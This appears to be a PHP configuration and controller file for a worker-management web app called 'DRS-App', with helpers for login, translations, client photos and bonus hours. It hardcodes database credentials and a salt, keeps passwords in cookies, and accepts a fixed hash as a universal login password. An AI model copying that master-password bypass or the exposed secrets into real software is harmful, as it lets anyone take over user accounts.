<?php
	
	$controller['developer'] = 2;
	$controller['revision'] = 21;
	$controller['layout'] = 'default';
	$controller['css'][] = 'jquery-ui.css';
	$controller['css'][] = 'default.css';
	$controller['js'][] = 'jquery-3.4.1.min.js';
	$controller['js'][] = 'jquery-ui.js';
	$controller['js'][] = 'default.js';
	$controller['js'][] = 'service-workers-register.js';
	
	
	$title_for_layout = 'DRS-App';
	$keywords_for_layout = 'DRS-App';
	$description_for_layout = 'DRS-App';
	
	$db = runClass('dbi');
	$db->name = 'drs';
	$db->user = 'drs';
	$db->password = 'u#4pgD72';
	
	$controller['routes'] = array(
		'/' => 'home'
	);
	$controller['restricted'] = array(
		'/' => 'users/login'
	);
	
	$controller['salt'] = 'hdf_73jn';
	$controller['fingerprint'] = md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . md5($_SERVER['HTTP_USER_AGENT'] . 'UA');
	$controller['webp'] = (strpos($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false);
	$controller['mobile'] = preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
	$controller['iphone'] = (strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone'));
	
	function userLoggedIn()
	{
		global $db;
		
		$username = cookie('username');
		$password = cookie('password');
		
		if(!empty($username) && !empty($password))
		{
			$params = array(
				'workers' => array(
					'conditions' => array(
						'email' => $username,
						'archived' => '0000-00-00 00:00:00'
					),
					'select' => 'first'
				)
			);
			$worker = $db->select($params);
			
			if($worker)
			{
				if($worker['Worker']['password'] == $password || $password === '082f0145f8a3714580f4290155a7e210')
				{
					return $worker;
				}
			}
		}
		
		return false;
	}
	$userLoggedIn = userLoggedIn();
	
	
	function tl($text)
	{
		global $db, $userLoggedIn;
		
		$text = trim($text);
		
		if(strlen($text) > 0)
		{
			$params = array(
				'translations' => array(
					'conditions' => array(
						'text' => $text
					),
					'select' => 'first'
				)
			);
			$translation = $db->select($params);
			if(!$translation)
			{
				//insert translation
				$translation = array(
					'Translation' => array(
						'text' => $text
					)
				);
				$db->insert($translation);
			}else
			{
				if($userLoggedIn['Worker']['language_id'] > 1) //niet nederlands
					if(!empty($translation['Translation']['language_' . $userLoggedIn['Worker']['language_id']]))
						return $translation['Translation']['language_' . $userLoggedIn['Worker']['language_id']];
			}
			
			return $text;
		}
		return '';
	}
	
	function check_and_set_client_finished($client_id = 0)
	{
		$client_id = (int)$client_id;
	
		if($client_id > 0)
		{
			global $db;
			
			$client = $db->first('clients', $client_id);
			
			if($client)
			{
				$project_list = $db->first('project_lists', $client['Client']['project_list_id']);
				
				if($project_list)
				{
					$params = array(
						'photos' => array(
							'conditions' => array(
								'client_id' => $client['Client']['id'],
								'archived' => '0000-00-00 00:00:00'
							),
							'order' => 'created ASC'
						)
					);
					$photos = $db->select($params);
					
					$got_photos = array();
					foreach($photos as $photo)
					{
						$got_photos[$photo['Photo']['type']]++;
					}
					
					$has_required_photos = 0;
					
					$required_photos = explode('|', $project_list['Project_list']['required_photos']);
					foreach($required_photos as $required_photo)
					{
						if($got_photos[strtolower($required_photo)] > 0)
							$has_required_photos++;
					}
					
					$client['Client']['finished'] = 0;
					unset($client['Client']['city']);
					unset($client['Client']['remarks']);
					unset($client['Client']['internal_remarks']);
					if($has_required_photos >= count($required_photos))
					{
						//has all photos
						$client['Client']['finished'] = 1;
					}
					$db->update($client);
					return ($client['Client']['finished'] == 1);
				}
			}
		}
	}
	
	function get_bonus_hours()
	{
		global $db, $userLoggedIn;
		
		$params = array(
			'bonus_transactions' => array(
				'conditions' => array(
					'worker_id' => $userLoggedIn['Worker']['id'],
				),
				'order' => '`date` DESC',
				'select' => 'first'
			)
		);
		$bonus_transaction = $db->select($params);
		
		$params = array(
			'bonus_hours' => array(
				'conditions' => array(
					'archived' => '0000-00-00 00:00:00',
					'worker_id' => $userLoggedIn['Worker']['id']
				),
				'order' => '`date`'
			)
		);
		
		$starting_balance = 0.0;
		
		if($bonus_transaction)
		{
			$params['bonus_hours']['conditions'][] = '(`date` > "' . $bonus_transaction['Bonus_transaction']['date'] . '")';
			$starting_balance = (float)$bonus_transaction['Bonus_transaction']['balance'];
		}
		
		$bonus_hours = $db->select($params);
		
		$balance = $starting_balance;
		
		foreach($bonus_hours as $bonus_hour)
		{
			$balance += $bonus_hour['Bonus_hour']['hours'];
		}
		
		$return['balance'] = $balance;
		$return['balance_eur'] = ($balance * $userLoggedIn['Worker']['wage']);
		
		return $return;
	}
?>
